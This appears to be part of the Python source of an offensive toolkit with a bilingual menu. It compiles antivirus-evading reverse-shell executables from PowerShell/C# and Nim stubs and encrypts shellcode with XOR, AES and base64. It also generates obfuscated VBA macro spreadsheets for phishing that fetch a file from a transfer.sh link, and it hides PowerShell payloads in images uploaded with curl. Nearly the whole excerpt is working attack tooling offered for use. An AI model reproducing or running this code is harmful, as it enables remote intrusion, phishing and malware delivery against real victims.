...
\033[1;36m 3.权限维持(\033[1;33mDynamic link library generation\033[0m)
\033[1;36m 4.文件捆绑(\033[1;33m File Bundle\033[0m)
\033[1;36m 5.反弹Shell(\033[1;33mReverShell Bypass AntiVirus\033[0m)
\033[1;36m 6.获取密码凭证(\033[1;33mPasswords Dumping Tools\033[0m)
\033[1;36m 7.shellcode加密解密(\033[1;33mShellCode EncryptionDecryptor\033[0m)
\033[1;36m 8.钓鱼文件生成(\033[1;33mPhishing File Generation\033[0m)
\033[1;36m 9.脚本命令混淆(\033[1;33mScript Command Obfuscation\033[0m)
\033[1;36m 10.Netcat建立监听(\033[1;33mNetcat establishes monitoring)\n
    ...
    while True:
        ...
        if Options == "5":
            while True:
                ...
                socketchoice = input(DAZZLINGCOLORS.OKGREEN + "Payload Option\n" +INOTGREEN)
                if socketchoice not in other_commands.sheshell_commandl:
                    other_commands.Shell_Command(socketchoice)
                    
                if socketchoice == "1":
                    ip = input(DAZZLINGCOLORS.OKGREEN +
                               "+----------+----+--------------------------+--------+\n"
                               "LocalHost IPAddress\n\n"+INOTGREEN)
                    port = input(DAZZLINGCOLORS.OKGREEN + "Local Port\n\n"+INOTGREEN)
                    ...
                    print(
                        ...
                        "|                                                     |\n"
                        "+----------+----+--------------------------+----------+\n")
                    Dotnet_choice = input("select .NET Version\n"+INOTGREEN)
                    PowerShell_Socket = PowerShell_Socket.replace("IPREPLACE", ip)
                    PowerShell_Socket = PowerShell_Socket.replace("PORTREPLACE", port)

                    PowerShell_stubEncryption = base64.b64encode(PowerShell_Socket.encode('utf-8')).decode("utf-8")
                    Csharp_stub = Csharp_stub.replace("csharp_return", PowerShell_stubEncryption)

                    print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
                    print(DAZZLINGCOLORS.OKGREEN +"[+] Generating PowerShell stubs")
                    writefile = open("csharp_socket.cs", "w")
                    writefile.write(Csharp_stub)
                    writefile.close()
                    sleep(1)
                    print(DAZZLINGCOLORS.OKGREEN +"[+] Save new stub to csharp_stub.cs")
                    sleep(1)
                    print(DAZZLINGCOLORS.OKGREEN +"[!]Embedding demo.ico C# assembly, please don't change its location")
                    sleep(1)
                    print(DAZZLINGCOLORS.OKGREEN + "[+] Compiling new stubs...")
                    sleep(1)
                    outfile = GetDesktopPath() + "\\csharp_socket.exe"
                    if os.path.exists(outfile) == True:
                        os.system("""del "{0}"\n""".format(outfile))
                    print(DAZZLINGCOLORS.OKGREEN +"[!] Generating csharp_socket.exe")
                    sleep(1)
                    if Dotnet_choice == "1":
                        os.system("""C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe /reference:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /nologo /warn:0 /out:"%userprofile%\\desktop\\csharp_socket.exe" /target:winexe csharp_socket.cs""")
                    else:
                        os.system("""C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\csc.exe /reference:C:\\WINDOWS\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /nologo /warn:0 /target:winexe /out:"{0}" .\csharp_socket.cs""".format(outfile))
                    if os.path.exists(outfile) == True:

                        print(DAZZLINGCOLORS.OKYELLOW +"[!]  Compile Successfully\n")
                    else:
                        print(DAZZLINGCOLORS.OKRED + "[!] Compilation failed")
                    pass
                    os.system("del csharp_socket.cs")

                if socketchoice == "2":
                    ip = input(DAZZLINGCOLORS.OKGREEN + "+----------+----+--------------------------+--------+\n\nLocalHost IPAddress\n" + INOTGREEN)
                    
                    port = input(DAZZLINGCOLORS.OKGREEN + "\n""\nLocal Port\n"+INOTGREEN)
                    
                    nim_socket = nim_socket.replace("IPREPLACE", ip)
                    nim_socket = nim_socket.replace("PORTREPLACE", port)

                    nim_stub = open("Nim_Socket.nim", "w")
                    nim_stub.write(nim_socket)
                    nim_stub.close()

                    print(DAZZLINGCOLORS.OKGREEN +"[+] Enable Verbose Messages")
                    sleep(1)
                    print(DAZZLINGCOLORS.OKGREEN +"[+] Save new stub to Nim_Socket.nim")
                    sleep(1)
                    outfile = GetDesktopPath() + "\\Nim_Socket.exe"
                    #print(PowerShell_Socket)
                    if os.path.exists(outfile) == True:
                        os.system("""del "{0}"\n""".format(outfile))
                    print(DAZZLINGCOLORS.OKGREEN +"[+] Embedding demo.ico Nim assembly, Don't change its location")
                    os.system("""nim c --hints:off --warnings:off -d:danger -d:mingw -d:release --passc=-flto --passl=-flto --app:Console -o:"{0}" Nim_Socket.nim""".format(outfile))

                    sleep(3)
                    if os.path.exists("Nim_Socket.exe") == True:
                        print(randomcolor() + """[!] Compile Successfully:"{0}"\n""".format(outfile))
                    else:
                        print(randomcolor() + "[!] Compilation Failed\n")
                ...
                if socketchoice == "back" or socketchoice == "BACK":
                    print(Option_stub)
                    break
                
        if Options == "6":
            print(randomcolor() + Get_Credentials)
            Options_choice = input(INOTGREEN)
            other_command(Options_choice)
        if Options == "7":  #shellcode加密

            while True:
                print(DAZZLINGCOLORS.OKPINK +
                      "+----------+----+--------------------------+--------+----+\n"
                      "*                                                        *\n"
                      "|1.XOR动态密钥加密(XOR dynamic key encryption)           |\n"
                      "*                                                        *\n"
                      "|2.base64加密(base64 encryption)                         |\n"
                      "*                                                        *\n"
                      "|3.AES256动态密钥(AES256 dynamic key)                    |\n"
                      "*                                                        *\n"
                      "|4.rc4加密(rc4 encryption)                               |\n"
                      "*                                                        *\n"
                      "+----------+----+--------------------------+--------+----+\n"
                      )
                encrypt_chocie = input(DAZZLINGCOLORS.OKGREEN + "请输入加密方式(Enter the encryption method)\n" + INOTGREEN)
                if encrypt_chocie not in other_commands.sheshell_commandl:
                    other_commands.Shell_Command(encrypt_chocie)
                if encrypt_chocie == "back" or encrypt_chocie == "BACK":
                    print(Option_stub)
                    break
                if encrypt_chocie == "1":
                    print("\n")
                    print("Please enter shellcode\n" + INOTGREEN)
                    filepath = ReadFilePath("*")
                
                    if os.path.exists(filepath) == True:
                        with open(filepath) as files:
                            text = files.read()
                        Stub.Encryptor.Encryptor.XOREncryptor(text)
                    else:
                        Stub.Encryptor.Encryptor.XOREncryptor(shellcode)

                if encrypt_chocie == "2":
                    #PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")
                    print("Please enter shellcode:" + INOTGREEN)
                    filepath = ReadFilePath("*")
                    if os.path.exists(filepath) == True:
                        with open(filepath,'r') as files:
                            text = files.read()
                            for line in text.splitlines():
                                base_stub = base64.b64encode(line.encode('utf-8')).decode("utf-8")
                        
                    print(DAZZLINGCOLORS.OKYELLOW + base_stub)
                    base64_ENC_STUB = open("base64Enc.txt", "w")
                    base64_ENC_STUB.write(base_stub)
                    base64_ENC_STUB.close()
                    os.system("base64Enc.txt")
                    break
                if encrypt_chocie == "3":
                    ...
                    if os.path.exists(filepath) == True:
                        with open(filepath) as files:
                            text = files.read()
                        Stub.Encryptor.Encryptor.AES256EncKeyIV(text, AES_Encrypt_stub)
                    else:
                        Stub.Encryptor.Encryptor.AES256EncKeyIV(shellcode, AES_Encrypt_stub)
                else:
                    other_command(encrypt_chocie)
        if Options == "8":
                ...
                print(randomcolor()+
                        "+----------+----+--------------------------+----------+\n"
                        "|                                                     |\n"
                        "|[1].Nim自动化嵌入宏代码(Nim automates embedded macro)|\n"
                        "|                                                     |\n"
                        "|                                                     |\n"
                        "|[2].....敬请期待(Please wait patiently)              |\n"
                        "|                                                     |\n"
                        "+----------+----+--------------------------+----------+\n")
                Choice = input(INOTGREEN)
                if Choice == "1":
                    ...
                    for line in context.splitlines():
                        url = line.replace(".sh/",".sh/get/")
                        
                        print(DAZZLINGCOLORS.OKGREEN+"[+] File URLDownload:" + url)
                        s= url.encode('utf-8')
                        urlhex = s.hex()
                        a = filename.encode('utf-8')
                        fileHEX = a.hex()
                        Macro_stub = Macro_stub.replace("URLREPLACE", urlhex)
                        Macro_stub = Macro_stub.replace("FileREPLACE",fileHEX)
                    print(DAZZLINGCOLORS.OKGREEN+"[+] Automatically generate obfuscated VBA code")
                    #Macro_stub = Macro_stub.replace("\\", "")
                    Nim_Macro_Stub = open("exclnim.nim", "w")
                    Nim_Macro_Stub.write(Macro_stub)
                    Nim_Macro_Stub.close()
                    
                    try:
                        print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
                        sleep(1)
                        print(DAZZLINGCOLORS.OKGREEN + "[+] Save new stub to exclnim.nim")
                        print(DAZZLINGCOLORS.OKGREEN + "[+] Compiling new stubs")
                        sleep(1)
                        
                        outfile = GetDesktopPath()+"\\stub.xls"
                        if os.path.exists(outfile) == True:
                            os.system("""del "{0}"\n""".format(outfile))
                        os.system("nim c --hints:off --warnings:off -d:release -d:strip exclnim.nim")
                        print(DAZZLINGCOLORS.OKGREEN + "[+] Generating macro file")
                        sleep(1)
                        print(DAZZLINGCOLORS.OKGREEN + "[+] Extracting stub.xls to {0} director".format(GetDesktopPath()))
                        os.system("""exclnim.exe "{0}"\n""".format(outfile))
                        os.system("del exclnim.nim && del exclnim.exe")
                        
                        if(os.path.exists(outfile))==True:
                            print(DAZZLINGCOLORS.OKRED + """[!] The macro file was generated successfully:"{0}"\n""".format(outfile))
                            break
                        else:
                            print(DAZZLINGCOLORS.OKRED + "[!] The macro file was generated Failed!")
                            continue
                    except:
                        print(DAZZLINGCOLORS.OKGREEN + "The parameter is wrong")
                        continue
                    
                if Choice not in other_commands.sheshell_commandl:
                    
                    other_command(Choice)
...
[+]3.PowerShell图片隐写                     
                      """)
                Command_choice = input("Please enter your options:\n"+ INOTGREEN)
                
                if Command_choice == "1":
                    
                    print(Powershell_ExecutionPolicy)
                    
                    ExecutionPolicy = input(DAZZLINGCOLORS.OKGREEN + "是否继续执行当前进程，请输入y/n:\n"
                                            +INOTGREEN)
                    if ExecutionPolicy in ["y", "yes", "YES", "Y", ""]:
                        try:
                            os.system(
                                "powershell cd .\Invoke-Obfuscation\Invoke-DOSfuscation\;powershell .\main.ps1;")
                        except:
                            print("\033[1;31m请将当前的PowerShell执行策略修改为Unrestricted\033[0m")
                        break
                    if ExecutionPolicy in ["no", "n", "NO", "N"]:
                        break
                    if ExecutionPolicy == "back" and ExecutionPolicy == "BACK":
                        print(Option_stub)
                        break
                    else:
                        print("\033[1;31m无该选项请重新输入\033[0m")
                        pass
                ...
                if  Command_choice == "2":
                        ...
                        if ExecutionPolicy in ["y", "yes", "YES", "Y", ""]:
                            try:
                                os.system("powershell cd .\Invoke-Obfuscation\Invoke-Obfuscation-Bypass\;powershell .\main.ps1;")
                            except:
                                print("\033[1;31m请将当前的PowerShell执行策略修改为Unrestricted\033[0m")
                            break
                        if ExecutionPolicy in ["no", "n", "NO", "N"]:
                ...
                if Command_choice == "3":
                    ...
                    if ExecutionPolicy in ["y", "yes", "YES", "Y", ""]:
                        try:               
                            ...
                            os.system("""copy "{0}" Invoke-Obfuscation\\Invoke-PSImage\\payload.ps1""".format(FilePath))
                            result = os.popen("powershell Import-Module .\\Invoke-Obfuscation\\Invoke-PSImage\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Obfuscation\\Invoke-PSImage\\payload.ps1 -Out 456.png -Image .\\Invoke-Obfuscation\\Invoke-PSImage\\demo.jpg -Web")
                            context = result.read()
                            for line in context.splitlines():
                                result_png =os.popen("""curl --upload-file "456.png" https://transfer.sh/{0}""".format("5438.png")) 
                                result_png_context = result_png.read()
                                for line1 in result_png_context.splitlines():
                                    line1 = line1.replace(".sh/",".sh/get/")
                                    print("\n"+ randomcolor() + line.replace("http://example.com/456.png",line1))
                                    print(randomcolor() + "\n\n\n" + "图片下载路径:"+line1+"\n\n\n")
                                    result_png.close()
                ...
                if Command_choice not in other_commands.sheshell_commandl:
                    print(Option_stub)
